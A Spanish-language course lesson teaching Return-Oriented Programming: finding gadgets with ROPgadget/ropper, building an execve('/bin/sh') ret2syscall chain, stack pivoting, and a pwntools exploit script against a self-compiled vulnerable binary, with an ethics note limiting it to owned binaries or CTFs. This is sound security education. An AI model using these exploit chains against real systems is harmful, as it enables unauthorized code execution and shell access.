# Clase 124 — Return-Oriented Programming (ROP)

> Parte: **5 — Explotación de sistemas y binarios** · Fuente: *Shacham, "The Geometry of Innocent Flesh…"* · docs pwntools
> ⏱️ Duración estimada: **140 min** · Nivel: **Avanzado**

---

## 🎯 Objetivo

Dominar **ROP**, la generalización de ret2libc: encadenar múltiples *gadgets* (fragmentos que terminan
en `ret`) para construir cómputo arbitrario sin inyectar código, evadiendo NX por completo. Aprenderás
a buscar gadgets, a razonar sobre el flujo de una cadena y a realizar un **ret2syscall**/`execve` con
`ROPgadget` y el motor `ROP` de pwntools.

> ⚠️ **Ética:** solo en binarios propios o retos de CTF autorizados.

## 📚 Resultados de aprendizaje

Al finalizar, el alumno podrá:

1. **Definir** qué es un gadget y cómo `ret` encadena varios.
2. **Buscar** gadgets útiles con `ROPgadget`/`ropper`.
3. **Construir** una cadena que cargue registros y ejecute una syscall (`execve`).
4. **Usar** el autogenerador `ROP()` de pwntools.
5. **Depurar** cadenas ROP paso a paso en GDB.

## 🗺️ Temas

| # | Tema | Por qué importa |
| --- | --- | --- |
| 1 | Gadgets y el rol de `ret` | Unidad y pegamento de la cadena |
| 2 | Turing-completitud de ROP | Se puede computar casi todo |
| 3 | Búsqueda de gadgets | Materia prima del exploit |
| 4 | Cargar registros (pop) | Preparar argumentos de syscall |
| 5 | ret2syscall / execve | Objetivo sin depender de libc externa |
| 6 | Cadenas con pwntools ROP() | Automatización de alto nivel |
| 7 | Stack pivoting | Cuando el espacio es limitado |
| 8 | Depurar cadenas | Ver cada gadget ejecutarse |

## 📖 Definiciones y características

- **Gadget:** secuencia corta de instrucciones que finaliza en `ret` (o `jmp`/`call` controlado).
  *Clave:* `pop rdi; ret` carga un valor y devuelve el control a la cadena.
- **Cadena ROP:** lista de direcciones de gadgets (y datos) colocada en el stack. *Clave:* cada `ret`
  toma la siguiente dirección del stack.
- **ret2syscall:** cadena que prepara `RAX/RDI/RSI/RDX` y ejecuta `syscall` para `execve("/bin/sh")`.
  *Clave:* no necesita `system` de libc.
- **Stack pivot:** gadget que mueve `RSP` a memoria controlada (`xchg rsp, rax`, `leave; ret`).
  *Clave:* útil con overflow pequeño pero buffer grande en otro sitio.
- **ROPgadget / ropper:** herramientas que listan gadgets de un binario o librería. *Clave:* filtrar
  por la instrucción deseada.
- **pwntools ROP():** constructor que resuelve gadgets y ensambla la cadena. *Clave:* `rop.execve(...)`,
  `rop.chain()`.

## 🧰 Herramientas y preparación

```bash
pip install pwntools ROPgadget ropper
sudo apt install -y gdb
```

Usa un binario estático o con NX activo para practicar (`gcc -static -fno-stack-protector -no-pie`).

## 🧪 Laboratorio guiado

> Entorno propio.

1. Compila un objetivo con muchos gadgets (binario estático):

   ```bash
   gcc -static -no-pie -fno-stack-protector vuln.c -o ropme
   checksec ./ropme
   ```

2. Busca gadgets clave:

   ```bash
   ROPgadget --binary ropme | grep -E ": pop rdi ; ret|: pop rsi ; ret|: pop rdx ; ret|: syscall"
   ROPgadget --binary ropme --string '/bin/sh'   # o coloca tú la cadena en .bss
   ```

3. Construye una cadena `execve("/bin/sh", 0, 0)` a mano:

   - `pop rdi; ret` → dirección de `"/bin/sh"`
   - `pop rsi; ret` → 0
   - `pop rdx; ret` → 0
   - `pop rax; ret` → 59
   - `syscall`

4. Hazlo con pwntools automáticamente:

   ```python
   from pwn import *
   elf = context.binary = ELF("./ropme")
   rop = ROP(elf)
   binsh = next(elf.search(b"/bin/sh")) or 0  # o escribe /bin/sh en .bss con rop.write
   rop.execve(binsh, 0, 0)
   payload = b"A"*72 + rop.chain()
   p = process("./ropme"); p.sendline(payload); p.interactive()
   ```

5. Depura acoplando GDB (`gdb.attach(p)`) y observa cómo cada `ret` avanza por la cadena en `telescope`.

6. Si falta `/bin/sh` en el binario, usa `rop.write` para colocarla en `.bss` antes del `execve`.

## ✍️ Ejercicios

1. Escribe a mano (sin `ROP()`) la cadena execve y verifícala en GDB.
2. Usa `ropper` en lugar de `ROPgadget` y compara resultados.
3. Implementa un stack pivot con `leave; ret` hacia un buffer en `.bss`.
4. Construye una cadena que llame a `mprotect` para hacer ejecutable una región (ret2mprotect).
5. Explica por qué ROP es Turing-completo con gadgets suficientes.
6. Mide cuántos gadgets `pop` necesitas para 4 argumentos de syscall.

## 📝 Reto verificable

Entrega un exploit ROP que ejecute `execve("/bin/sh", NULL, NULL)` mediante syscall contra tu binario
estático, sin usar `system` de libc.

**Criterio de aceptación:** obtienes shell interactiva; la cadena incluye gadgets `pop rdi/rsi/rdx/rax`
y un `syscall`, verificable en el `telescope` de la cadena.

## ⚠️ Errores comunes

| Síntoma / mensaje | Causa y cómo arreglar |
| --- | --- |
| Crash a mitad de cadena | Un gadget tenía efectos colaterales (modifica otro registro) |
| No hay `pop rdx; ret` | Usa un gadget compuesto o `xor`/otro que ponga RDX a 0 |
| `/bin/sh` no está en el binario | Escríbela en `.bss` con `rop.write` |
| syscall no dispara execve | RAX no vale 59, o argumentos mal ordenados |
| Cadena demasiado larga para el buffer | Aplica stack pivot a una región mayor |

## ❓ Preguntas frecuentes

**❓ ¿ROP o ret2libc?** ret2libc es un caso simple; ROP generaliza a cómputo arbitrario y no depende
de tener `system`.

**❓ ¿Cómo elijo gadgets sin efectos colaterales?** Prefiere los más cortos y revisa cada instrucción
intermedia; los "clean gadgets" son los ideales.

**❓ ¿Sirve ROP contra CFI?** Control-Flow Integrity y CET/shadow stacks lo dificultan; es la frontera
actual de la investigación.

## 🔗 Referencias

- Shacham, H. "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls" (CCS 2007).
- pwntools ROP — <https://docs.pwntools.com/en/stable/rop/rop.html>
- ROP Emporium — <https://ropemporium.com/>
- ROPgadget — <https://github.com/JonathanSalwan/ROPgadget>

## 📥 Material descargable

- 📄 [Guía en PDF](./clase-124-guia.pdf) — versión imprimible de esta clase.
- 🎞️ [Presentación (PPTX)](./clase-124-presentacion.pptx) — deck para proyectar en clase.

## ➡️ Siguiente clase

[Clase 125 - Vulnerabilidades de format string](../125-vulnerabilidades-de-format-string/README.md)
